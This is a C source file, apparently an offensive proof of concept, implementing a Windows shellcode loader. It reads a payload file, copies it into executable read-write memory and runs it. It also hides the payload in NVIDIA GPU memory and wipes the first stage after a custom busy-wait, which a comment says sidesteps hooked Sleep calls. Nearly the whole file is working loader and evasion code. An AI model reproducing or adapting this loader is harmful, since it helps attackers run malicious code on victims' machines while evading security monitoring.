/*
	PROGRAMMED BY ORCA 3:20 PM 6/25/2022
	POC ON USING GPU MEMORY TO HIDE THE PAYLOAD
*/

#include <Windows.h>
#include <stdio.h>
#include "Common.h"

//#define DEBUG	  // just to save time and run ReadPayloadFile directly using a default path
#define GPUEngage // the thing
#define CleanStg1 // clean the first stage, (payload we read)

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// function to read the payload from disk
BOOL ReadPayloadFile(char* FileInput, PDWORD Stage1Size, unsigned char** PayloadRead) {
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD FileSize, lpNumberOfBytesRead;
	BOOL Succ;

	hFile = CreateFileA(FileInput, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] ERROR CreateFileA : %d\n", GetLastError());
		return FALSE;
	}

	FileSize = GetFileSize(hFile, NULL);
	unsigned char* Payload = (unsigned char*)malloc(FileSize);
	ZeroMemory(Payload, sizeof Payload);

	Succ = ReadFile(hFile, Payload, FileSize, &lpNumberOfBytesRead, NULL);
	if (!Succ) {
		printf("[!] ERROR ReadFile : %d\n", GetLastError());
		return FALSE;
	}
	
	printf("[i] Payload [%d] at 0x%p\n", lpNumberOfBytesRead, (void*)Payload);

	*PayloadRead = Payload;
	*Stage1Size = lpNumberOfBytesRead;

	CloseHandle(hFile);
	return TRUE;
}

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
#ifdef CleanStg1
typedef struct _CleanStage1 {
	DWORD Stage1Size;
	PVOID Stage1Address;
} CleanStage1, *PCleanStage1;

// http://filipivianna.blogspot.com/2010/07/usleep-on-windows-win32.html
void uSleep(int waitTime) {
	__int64 time1 = 0, time2 = 0, freq = 0;

	QueryPerformanceCounter((LARGE_INTEGER*)&time1);
	QueryPerformanceFrequency((LARGE_INTEGER*)&freq);

	do {
		QueryPerformanceCounter((LARGE_INTEGER*)&time2);
	} while ((time2 - time1) < waitTime);
}

void CleanStage1Thread (PCleanStage1 ThreadPrameters) {
	// Sleep for 3 sec , NOTE, that we can't use Sleep function cz its hooked 
	uSleep(3000000);
	ZeroMemory(ThreadPrameters->Stage1Address, ThreadPrameters->Stage1Size);
	VirtualFree(ThreadPrameters->Stage1Address, ThreadPrameters->Stage1Size, MEM_DECOMMIT);
}
#endif // CleanStg1

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//


int main(int argc, char ** argv) {

	PVOID Stage1Address = NULL;
	DWORD Stage1Size = NULL;
	unsigned char* Payload;
	

#ifndef DEBUG
	if (argc != 2) {
		printf("[-] Please Enter The Path Of The File To Run ... \n");
		return -1;
	}
	if (!ReadPayloadFile(argv[1], &Stage1Size, &Payload)) {
		return -1;
	}
#else // in case of debugging:
#define DEFAULT_PD_PATH "C:\\full\\path\\to\\payload.bin"
	if (!ReadPayloadFile(DEFAULT_PD_PATH, &Stage1Size, &Payload)) {
		return -1;
	}
#endif // !DEBUG

	if (Stage1Size == NULL || Payload == NULL){
		return -1;
	}

	// you could do better than VirtualAlloc with RWX, just a poc here ...
	if ((Stage1Address = VirtualAlloc(NULL, Stage1Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL){
		printf("[!] ERROR VirtualAlloc : %d\n", GetLastError());
		return -1;
	}
	else{
		memcpy(Stage1Address, Payload, Stage1Size);
		free(Payload); // freeing the read payload
	}

#ifdef GPUEngage
	if (!IsNvidiaGraphicsCardPresent()){
		printf("[!] You dont have nvidia gpu ... \n");
		return -1;
	}
	if (!InitializeMemToGpu()) {
		printf("[!] InitializeMemToGpu failed ... \n");
		return -1;
	}
#endif // GPUEngage


#ifdef CleanStg1
	// this is to clean stage 1 payload (the one we read)
	CleanStage1 ThreadPrameters = { 0 };
	ThreadPrameters.Stage1Size = Stage1Size;
	ThreadPrameters.Stage1Address = Stage1Address;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CleanStage1Thread, &ThreadPrameters, 0, NULL);
#endif // CleanStg1

	

	// running 
	(*(void(*)())Stage1Address)();

	printf("[i] Hit Enter To Exit ...");
	getchar();

	return 0;
}